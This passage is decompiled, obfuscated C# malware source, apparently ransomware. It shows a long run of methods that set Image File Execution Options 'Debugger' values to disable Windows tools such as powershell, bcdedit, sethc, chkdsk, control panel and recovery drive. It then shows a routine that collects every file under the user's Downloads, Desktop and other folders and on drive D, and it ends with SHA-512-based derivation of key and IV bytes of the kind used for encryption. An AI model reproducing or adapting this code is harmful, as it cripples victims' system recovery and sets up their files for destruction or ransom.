		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_24()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\powershell.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\powershell.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_25()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\yandex.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\yandex.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_26()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_27()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\bcdedit.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\bcdedit.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_28()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_29()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_30()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\dllhost.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\dllhost.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_31()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rundll32.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rundll32.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_32()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rundll.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rundll.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_33()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cabinet.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cabinet.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_34()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chkdsk.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chkdsk.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_35()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DBGHELP.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DBGHELP.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_36()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DCIMAN32.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DCIMAN32.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_37()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wmplayer.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wmplayer.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_38()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ksuser.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ksuser.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_39()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mpg4dmod.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mpg4dmod.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_40()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mydocs.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mydocs.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_41()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rasman.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rasman.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_42()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shellstyle.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shellstyle.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_43()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\secpol.msc", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\secpol.msc", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_44()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\url.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\url.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_45()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\usbui.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\usbui.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_46()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\webcheck.dll", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\webcheck.dll", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_47()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\recoverydrive.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\recoverydrive.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_48()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_49()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
		try
		{
			IEnumerator<string> enumerator = default(IEnumerator<string>);
			try
			{
				enumerator = Form1.smethod_44(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_43(Form1.smethod_10(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator2 = default(IEnumerator<string>);
				while (Form1.smethod_49((IEnumerator)enumerator))
				{
					string current = enumerator.Current;
					try
					{
						enumerator2 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), current).GetEnumerator();
						while (Form1.smethod_49((IEnumerator)enumerator2))
						{
							string current2 = enumerator2.Current;
							if (!Form1.smethod_46(current2, "desktop.ini"))
							{
								Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current2);
							}
						}
					}
					finally
					{
						if (enumerator2 != null)
						{
							Form1.smethod_50((IDisposable)enumerator2);
						}
					}
				}
			}
			finally
			{
				if (enumerator != null)
				{
					Form1.smethod_50((IDisposable)enumerator);
				}
			}
		}
		catch (Exception exception_)
		{
			Form1.smethod_22(exception_);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator3 = default(IEnumerator<string>);
			try
			{
				enumerator3 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_43(Form1.smethod_10(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form1.smethod_49((IEnumerator)enumerator3))
				{
					string current3 = enumerator3.Current;
					if (!Form1.smethod_46(current3, "desktop.ini"))
					{
						Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current3);
					}
				}
			}
			finally
			{
				if (enumerator3 != null)
				{
					Form1.smethod_50((IDisposable)enumerator3);
				}
			}
		}
		catch (Exception exception_2)
		{
			Form1.smethod_22(exception_2);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator4 = default(IEnumerator<string>);
			try
			{
				enumerator4 = Form1.smethod_44(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_51(Form1.smethod_10(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator5 = default(IEnumerator<string>);
				while (Form1.smethod_49((IEnumerator)enumerator4))
				{
					string current4 = enumerator4.Current;
					try
					{
						enumerator5 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), current4).GetEnumerator();
						while (Form1.smethod_49((IEnumerator)enumerator5))
						{
							string current5 = enumerator5.Current;
							if (!Form1.smethod_46(current5, "desktop.ini"))
							{
								Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current5);
							}
						}
					}
					finally
					{
						if (enumerator5 != null)
						{
							Form1.smethod_50((IDisposable)enumerator5);
						}
					}
				}
			}
			finally
			{
				if (enumerator4 != null)
				{
					Form1.smethod_50((IDisposable)enumerator4);
				}
			}
		}
		catch (Exception exception_3)
		{
			Form1.smethod_22(exception_3);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator6 = default(IEnumerator<string>);
			try
			{
				enumerator6 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_51(Form1.smethod_10(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form1.smethod_49((IEnumerator)enumerator6))
				{
					string current6 = enumerator6.Current;
					if (!Form1.smethod_46(current6, "desktop.ini"))
					{
						Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current6);
					}
				}
			}
			finally
			{
				if (enumerator6 != null)
				{
					Form1.smethod_50((IDisposable)enumerator6);
				}
			}
		}
		catch (Exception exception_4)
		{
			Form1.smethod_22(exception_4);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator7 = default(IEnumerator<string>);
			try
			{
				enumerator7 = Form1.smethod_44(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_52(Form1.smethod_10(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator8 = default(IEnumerator<string>);
				while (Form1.smethod_49((IEnumerator)enumerator7))
				{
					string current7 = enumerator7.Current;
					try
					{
						enumerator8 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), current7).GetEnumerator();
						while (Form1.smethod_49((IEnumerator)enumerator8))
						{
							string current8 = enumerator8.Current;
							if (!Form1.smethod_46(current8, "desktop.ini"))
							{
								Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current8);
							}
						}
					}
					finally
					{
						if (enumerator8 != null)
						{
							Form1.smethod_50((IDisposable)enumerator8);
						}
					}
				}
			}
			finally
			{
				if (enumerator7 != null)
				{
					Form1.smethod_50((IDisposable)enumerator7);
				}
			}
		}
		catch (Exception exception_5)
		{
			Form1.smethod_22(exception_5);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator9 = default(IEnumerator<string>);
			try
			{
				enumerator9 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_52(Form1.smethod_10(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form1.smethod_49((IEnumerator)enumerator9))
				{
					string current9 = enumerator9.Current;
					if (!Form1.smethod_46(current9, "desktop.ini"))
					{
						Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current9);
					}
				}
			}
			finally
			{
				if (enumerator9 != null)
				{
					Form1.smethod_50((IDisposable)enumerator9);
				}
			}
		}
		catch (Exception exception_6)
		{
			Form1.smethod_22(exception_6);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator10 = default(IEnumerator<string>);
			try
			{
				enumerator10 = Form1.smethod_44(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_18("C:\\Users\\", Form1.smethod_53(), "\\Downloads"), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator11 = default(IEnumerator<string>);
				while (Form1.smethod_49((IEnumerator)enumerator10))
				{
					string current10 = enumerator10.Current;
					try
					{
						enumerator11 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), current10).GetEnumerator();
						while (Form1.smethod_49((IEnumerator)enumerator11))
						{
							string current11 = enumerator11.Current;
							if (!Form1.smethod_46(current11, "desktop.ini"))
							{
								Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current11);
							}
						}
					}
					finally
					{
						if (enumerator11 != null)
						{
							Form1.smethod_50((IDisposable)enumerator11);
						}
					}
				}
			}
			finally
			{
				if (enumerator10 != null)
				{
					Form1.smethod_50((IDisposable)enumerator10);
				}
			}
		}
		catch (Exception exception_7)
		{
			Form1.smethod_22(exception_7);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator12 = default(IEnumerator<string>);
			try
			{
				enumerator12 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_18("C:\\Users\\", Form1.smethod_53(), "\\Downloads")).GetEnumerator();
				while (Form1.smethod_49((IEnumerator)enumerator12))
				{
					string current12 = enumerator12.Current;
					if (!Form1.smethod_46(current12, "desktop.ini"))
					{
						Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current12);
					}
				}
			}
			finally
			{
				if (enumerator12 != null)
				{
					Form1.smethod_50((IDisposable)enumerator12);
				}
			}
		}
		catch (Exception exception_8)
		{
			Form1.smethod_22(exception_8);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator13 = default(IEnumerator<string>);
			try
			{
				enumerator13 = Form1.smethod_44(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_18("C:\\Users\\", Form1.smethod_53(), "\\Desktop"), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator14 = default(IEnumerator<string>);
				while (Form1.smethod_49((IEnumerator)enumerator13))
				{
					string current13 = enumerator13.Current;
					try
					{
						enumerator14 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), current13).GetEnumerator();
						while (Form1.smethod_49((IEnumerator)enumerator14))
						{
							string current14 = enumerator14.Current;
							if (!Form1.smethod_46(current14, "desktop.ini"))
							{
								Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current14);
							}
						}
					}
					finally
					{
						if (enumerator14 != null)
						{
							Form1.smethod_50((IDisposable)enumerator14);
						}
					}
				}
			}
			finally
			{
				if (enumerator13 != null)
				{
					Form1.smethod_50((IDisposable)enumerator13);
				}
			}
		}
		catch (Exception exception_9)
		{
			Form1.smethod_22(exception_9);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator15 = default(IEnumerator<string>);
			try
			{
				enumerator15 = Form1.smethod_44(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_18("C:\\Users\\", Form1.smethod_53(), "\\Desktop"), (SearchOption)3, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator16 = default(IEnumerator<string>);
				while (Form1.smethod_49((IEnumerator)enumerator15))
				{
					string current15 = enumerator15.Current;
					try
					{
						enumerator16 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), current15).GetEnumerator();
						while (Form1.smethod_49((IEnumerator)enumerator16))
						{
							string current16 = enumerator16.Current;
							if (!Form1.smethod_46(current16, "desktop.ini"))
							{
								Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current16);
							}
						}
					}
					finally
					{
						if (enumerator16 != null)
						{
							Form1.smethod_50((IDisposable)enumerator16);
						}
					}
				}
			}
			finally
			{
				if (enumerator15 != null)
				{
					Form1.smethod_50((IDisposable)enumerator15);
				}
			}
		}
		catch (Exception exception_10)
		{
			Form1.smethod_22(exception_10);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator17 = default(IEnumerator<string>);
			try
			{
				enumerator17 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), Form1.smethod_18("C:\\Users\\", Form1.smethod_53(), "\\Desktop")).GetEnumerator();
				while (Form1.smethod_49((IEnumerator)enumerator17))
				{
					string current17 = enumerator17.Current;
					if (!Form1.smethod_46(current17, "desktop.ini"))
					{
						Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current17);
					}
				}
			}
			finally
			{
				if (enumerator17 != null)
				{
					Form1.smethod_50((IDisposable)enumerator17);
				}
			}
		}
		catch (Exception exception_11)
		{
			Form1.smethod_22(exception_11);
			Form1.smethod_23();
		}
		try
		{
			IEnumerator<string> enumerator18 = default(IEnumerator<string>);
			try
			{
				enumerator18 = Form1.smethod_44(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), "D:\\", (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator19 = default(IEnumerator<string>);
				while (Form1.smethod_49((IEnumerator)enumerator18))
				{
					string current18 = enumerator18.Current;
					try
					{
						enumerator19 = Form1.smethod_45(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), current18).GetEnumerator();
						while (Form1.smethod_49((IEnumerator)enumerator19))
						{
							string current19 = enumerator19.Current;
							if (!Form1.smethod_46(current19, "desktop.ini"))
							{
								Form1.smethod_48(Form1.smethod_47(ListBox1), (object)current19);
							}
						}
					}
					finally
					{
						if (enumerator19 != null)
						{
							Form1.smethod_50((IDisposable)enumerator19);
						}
					}
				}
			}
			finally
			{
				if (enumerator18 != null)
				{
					Form1.smethod_50((IDisposable)enumerator18);
				}
			}
		}
		catch (Exception exception_12)
		{
			Form1.smethod_22(exception_12);
			Form1.smethod_23();
		}
		Form1.smethod_54(Timer_0);
	}

	public byte[] method_50(string string_5)
	{
		char[] array = Form1.smethod_55(string_5);
		int num = Form1.smethod_56((Array)array, 0);
		checked
		{
			byte[] array2 = new byte[num + 1];
			int num2 = Form1.smethod_56((Array)array, 0);
			for (int i = 0; i <= num2; i++)
			{
				array2[i] = (byte)Form1.smethod_57(array[i]);
			}
			SHA512Managed hashAlgorithm_ = Form1.smethod_58();
			byte[] array3 = Form1.smethod_59((HashAlgorithm)hashAlgorithm_, array2);
			byte[] array4 = new byte[32];
			int num3 = 0;
			do
			{
				array4[num3] = array3[num3];
				num3++;
			}
			while (num3 <= 31);
			return array4;
		}
	}

	public byte[] method_51(string string_5)
	{
		char[] array = Form1.smethod_55(string_5);
		int num = Form1.smethod_56((Array)array, 0);
		checked
		{
			byte[] array2 = new byte[num + 1];
			int num2 = Form1.smethod_56((Array)array, 0);
			for (int i = 0; i <= num2; i++)
			{
				array2[i] = (byte)Form1.smethod_57(array[i]);
			}
			SHA512Managed hashAlgorithm_ = Form1.smethod_58();
			byte[] array3 = Form1.smethod_59((HashAlgorithm)hashAlgorithm_, array2);
			byte[] array4 = new byte[16];
			int num3 = 32;
			do
			{
